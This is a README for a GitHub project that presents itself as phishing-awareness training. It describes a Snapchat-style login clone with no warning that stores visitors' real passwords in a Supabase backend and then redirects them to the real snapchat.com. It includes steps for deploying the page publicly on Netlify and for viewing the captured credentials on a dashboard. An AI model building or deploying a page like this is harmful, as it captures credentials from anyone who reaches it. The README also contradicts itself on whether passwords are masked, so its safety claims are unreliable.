# snaps — Phishing Awareness Training Demo

A clearly-labelled training simulation that teaches how credential-phishing
pages work. It serves a Snapchat-style login clone; after the visitor submits
the form they are bounced **straight to the genuine snapchat.com** — the exact
experience a real phishing victim has. There is no reveal on the way through:
the instructor reviews what was captured afterwards at `/password` (local
classroom mode, or on the deployed site via Netlify Functions + Supabase).

> ⚠ This is an educational demo. The login page intentionally carries **no
> warning** — that is the teaching point (deferred disclosure, like real
> simulated-phishing training). It is designed to be shown by an instructor,
> not shared as a public link without context.

## Two ways to run it

### 1. Local classroom demo (full capture) — Flask

Runs the complete experience with an instructor view. Everything stays on
`127.0.0.1`:

```bash
pip install -r requirements.txt
python app.py
```

Then open http://127.0.0.1:5000/login.html

- Submissions are stored in memory and appended to `captured_credentials.txt`
  (git-ignored — never commit or deploy it).
- Instructor dashboards (localhost only): http://127.0.0.1:5000/password and
  `/captures` — both show the real captured values, so the class can see
  exactly what an attacker would have harvested.
- Optional cloud mirror: each submission is also POSTed to the class Supabase
  project (including the real password — instructor opted in) so the
  instructor gets a live "attacker's dashboard" in the Supabase UI and on the
  deployed `/password` page. Run `supabase_setup.sql`
  once in the project's SQL editor first (creates the table + RLS policy;
  the public key can INSERT but never SELECT). The mirror is best-effort —
  if it fails the demo keeps working and the error is logged.
- The `/debrief/<id>` page (educational reveal, real password) is kept as an
  instructor tool for after-class discussion; it is not part of the live flow.

### 2. Netlify / static hosting — browser-only front end + serverless capture

Netlify is a static host, so the Flask backend is not used. The static build
reimplements the whole flow **in the browser**:

- No Flask backend — the login page runs entirely in the browser.
- The typed values are stashed in the visitor's own `sessionStorage`
  (per-tab, wiped when the tab closes), and the submission is mirrored to
  `/api/capture` before the bounce — real password included, instructor opted
  in (see below).

Deploy options (pick one — drag & drop will NOT work for this project):

- **GitHub-connected (required for the backend):** push this repo and
  connect it — Netlify → *Add new site* → *Import an existing project* →
  GitHub → select `NuelNexus/snaps`. Every push redeploys and the
  `netlify/functions/` serverless functions are built automatically.
- **CLI:** `npx netlify-cli deploy --prod` from this folder (also deploys
  the functions).
- ⚠️ **Drag & drop deploys static files ONLY** — the serverless functions
  are skipped, so `/password` and `/api/capture` return "Page Not Found"
  on a dragged site. Don't use it for this project.

Static pages: `index.html` → `Acconts.html` → `login.html`. No build step
needed. The login page auto-detects which build is serving it (via
`/api/mode`): on Flask it POSTs to `/login` so the capture + instructor views
work; on static hosting it bounces the visitor straight to snapchat.com and
mirrors a **masked** submission to the backend below.

#### The Netlify backend — `/api/capture` and `/password`

The deployed site ships two small serverless functions (in
`netlify/functions/`):

- **`POST /api/capture`** — the login page posts the submission (including
  the real password — instructor opted in for the full demo experience) here
  before bouncing to snapchat.com; the function stores it in Supabase.
- **`GET /password`** — passcode-protected instructor dashboard (HTTP Basic
  Auth, username `instructor`). Shows usernames, timestamps, IPs and the
  real captured passwords from Supabase. Anyone with the passcode can read
  every password — keep it secret.

Environment variables (Netlify → Site configuration → Environment variables):

| Variable | Value |
| --- | --- |
| `SUPABASE_URL` | `https://txusshocoamqmxsbbrdm.supabase.co` |
| `SUPABASE_ANON_KEY` | publishable key (`sb_publishable_…`) — INSERT only |
| `SUPABASE_SERVICE_KEY` | service/secret key (`sb_secret_…`) — **keep secret**; used only by `/password` |
| `DEMO_INSTRUCTOR_PASS` | passcode for `/password` (username is `instructor`) |

The actual values are in the git-ignored `.env` (see `.env.example`). After
adding them, trigger a redeploy (Netlify → *Deploys* → *Clear cache & deploy
site* — or push a commit) and visit
`https://<your-site>.netlify.app/password`. You'll get a browser login
prompt: username `instructor`, password = your `DEMO_INSTRUCTOR_PASS`.

Why real passwords? The instructor opted into the full demo experience: the
deployed site demonstrates the capture/dashboard mechanics end-to-end, and the
dashboard that displays them is passcode-protected. Because the site is
public, anyone who lands on it and types a real password will have it stored —
tell your class to use fake passwords, and keep the passcode secret.

## Safety guardrails

- `app.py` binds to `127.0.0.1` only — never expose it on a network.
- `captured_credentials.txt` is git-ignored and must never be deployed.
- The deployed `/password` dashboard is passcode-protected (Basic Auth) — the
  only read path to the captures. Keep `DEMO_INSTRUCTOR_PASS` secret.
- The Supabase RLS policy from `supabase_setup.sql` (anon = INSERT-only) means
  the public key can never read submissions — only the service-role key used
  by `/password` can.
